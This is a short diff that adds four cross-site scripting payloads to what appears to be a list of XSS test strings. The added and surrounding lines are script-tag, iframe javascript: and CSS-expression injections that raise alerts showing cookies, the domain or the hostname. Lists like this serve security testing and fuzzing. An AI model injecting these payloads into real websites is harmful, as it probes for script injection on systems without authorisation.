@@ -30,3 +30,7 @@ abc';alert('hacked'); //
 #evul<script>alert('hacked')</script>
 <script>alert(document.domain)</script>
 <font style='color.expression(alert(document.cookie))'>
+<script>alert(document.cookie)</script>
+<script>alert(document.cookies)</script>
+<iframe src="javascript:alert('HACKED')">
+<script>alert(window.location.hostname)</script>
